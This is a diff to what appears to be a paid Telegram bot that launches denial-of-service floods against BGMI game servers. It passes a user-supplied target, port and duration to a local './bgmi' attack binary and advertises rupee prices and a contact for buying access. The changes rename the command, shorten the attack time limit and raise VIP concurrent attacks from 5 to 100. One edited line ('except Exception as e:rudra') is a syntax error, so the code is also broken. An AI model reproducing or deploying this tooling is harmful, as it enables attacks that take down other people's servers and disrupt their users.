@@ -307,10 +307,10 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 600:
-                response = "Error: Time interval must be less than 600."
+            if time > 300:
+                response = "Error: Time interval must be less than 300."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/rudra', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 110"
@@ -318,7 +318,7 @@ def handle_bgmi(message):
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /rudra <target> <port> <time>"  # Updated command syntax
     else:
         response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @RUDRA_0846")
 
@@ -397,7 +397,7 @@ def welcome_plan(message):
 Vip 🌟 :
 -> Attack Time : 300 (S)
 > After Attack Limit : 10 sec
--> Concurrents Attack : 5
+-> Concurrents Attack : 100
 
 Pr-ice List💸 :
 Day-->80 Rs
@@ -449,7 +449,7 @@ def broadcast_message(message):
 while True:
     try:
         bot.polling(none_stop=True)
-    except Exception as e:
+    except Exception as e:rudra
         print(e)
 
 
